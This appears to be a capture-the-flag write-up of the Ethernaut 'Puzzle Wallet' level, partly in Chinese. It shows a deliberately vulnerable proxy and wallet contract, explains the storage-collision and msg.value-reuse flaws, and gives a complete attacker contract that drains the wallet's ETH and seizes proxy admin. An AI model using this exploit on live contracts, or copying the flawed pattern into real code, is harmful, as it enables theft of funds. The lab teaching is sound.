# Puzzle Wallet

> Nowadays, paying for `DeFi` operations is impossible, fact.
>
> A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.
>
> They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
>
> Little did they know, their lunch money was at risk…
>
>  You'll need to hijack this wallet to become the admin of the proxy.
>
>  Things that might help::
>
> - Understanding how `delegatecall`s work and how `msg.sender` and `msg.value` behaves when performing one.
> - Knowing about proxy patterns and the way they handle storage variables.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

## 攻击思路

项目采用可升级架构，使用代理调用来实现附加的功能。关卡给的[实例地址](https://rinkeby.etherscan.io/address/0x37B1CCA8C6e0017120c335963A6766cBD6e27BE8)的ABI是`PuzzleWallet`合约的，但是实例地址下的实际合约为`PuzzleProxy`合约，所有非`PuzzleProxy`合约中的函数调用，都通过`fallback`和`receive`函数进行了代理调用，代码如下。

```solidity
function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 because we don't know the size yet.
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
```

其次，因为是代理调用，**每一次函数调用（call）所使用的函数变量都是`PuzzleProxy`合约插槽中的数据。**`PuzzleProxy`合约插槽0中有`pendingAdmin`（address占20字节）变量，插槽1中有`admin`（address占20字节）变量。

关卡的目标是让我们的账户地址成为`PuzzleProxy`合约的`admin`。也就是说要改变`PuzzleProxy`合约插槽1中的数据。

但`PuzzleProxy`合约可以改变插槽1中的数据的操作，有构造函数和`approveNewAdmin`函数，构造参数不能重复调用。`approveNewAdmin`函数只能`admin`账户才能调用，而成为`admin`角色只能通过`approveNewAdmin`函数，死锁失败。

而`PuzzleWallet`合约可以改变插槽1中的数据的操作，即改变`maxBalance`变量（uint256占32位）的值。有构造函数和`setMaxBalance`函数，构造参数不能重复调用。`setMaxBalance`函数函数调用有两个限制，一个是合约实例地址下的ETH余额为0，另一个是调用账户成为白名单用户。

1. 使我们的账户成为白名单用户。要成为白名单用户，只能通过`addToWhitelist`函数，但这个函数只能由owner账户地址调用。owner变量存储在插槽0中，要改变插槽0中的数据，可以通过`PuzzleProxy`合约的`proposeNewAdmin`函数，这样我们的账户地址就会存储在插槽0中，插槽0中的数据在`PuzzleProxy`合约中是`pendingAdmin`变量,在`PuzzleWallet`合约中是`owner`变量。从而我们的账户地址就变成了`PuzzleWallet`合约的`owner`。就可以调用`setMaxBalance`函数。
2. 让合约实例地址下的ETH余额变为0。初始状态下合约实例地址下有0.001个ETH。`PuzzleWallet`合约中可以消耗ETH的操作只有`execute`函数，该函数会执行一次payable的call操作。但`execute`函数要求我们在合约中的余额不小于调用时转的帐。这样就出问题了。每一次调用都需要我们提前给合约打相应的ETH。这样无论如果都不会消耗完合约中的ETH。但合约提供了`multicall`函数，允许我们可以一笔交易调用多次函数，在多次函数调用中`msg.value`d的值时不变的，从未可以达到只转一次钱，但合约中我们的余额增加多次的效果，从而直接消耗完合约中的ETH。但`multicall`函数中不允许我们多次调用`deposit`函数，可`multicall`函数并没有限制多次调用`multicall`函数进行重入攻击。每一次`multicall`函数调用都调用一次`deposit`函数，多调用几次`multicall`函数从而达到多次调用`deposit`函数的效果。

## 攻击流程

```solidity

contract Attack {
    PuzzleProxy target1 = PuzzleProxy(0x37B1CCA8C6e0017120c335963A6766cBD6e27BE8);
    PuzzleWallet target2 = PuzzleWallet(0x37B1CCA8C6e0017120c335963A6766cBD6e27BE8);

    function attack() payable public{
        target1.proposeNewAdmin(address(this));// 让合约成为target2的owner
        target2.addToWhitelist(address(this));// 让合约成为白名单用户

        bytes memory depositData = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory depositDatas = new bytes[](1);
        depositDatas[0] = depositData;

        bytes memory multicallData = abi.encodeWithSelector(PuzzleWallet.multicall.selector,depositDatas);
        bytes[] memory multicallDatas = new bytes[](2);
        multicallDatas[0] = multicallData;
        multicallDatas[1] = multicallData;

        bytes memory Data = abi.encodeWithSelector(PuzzleWallet.multicall.selector,multicallDatas);
        bytes[] memory Datas = new bytes[](1);
        Datas[0] = Data;

        target2.multicall{value:msg.value}(Datas);//重入攻击，使合约中余额变成转账的两倍，合约ETH余额0.001，所以我们转0.001，合约ETH余额变为0.002，我们在合约中的余额也变为0.002

        target2.execute(msg.sender, address(target2).balance, "");//转空合约中的eth

        target2.setMaxBalance(uint256(address(this)));//让合约成为admin

        target1.upgradeTo(msg.sender);// 吃饭完，掀桌子
        target1.proposeNewAdmin(msg.sender);//让我的账户成为admin
        target1.approveNewAdmin(msg.sender);
    }  
}
```

[攻击交易](https://rinkeby.etherscan.io/tx/0x96b213a29d501700fbd631c50b487abf2414fb39262d64fcde8449b07a685791)

Next time, those friends will request an audit before depositing any money on a contract. Congrats!

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, `msg.value` will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract.

Move on to the next level when you're ready!

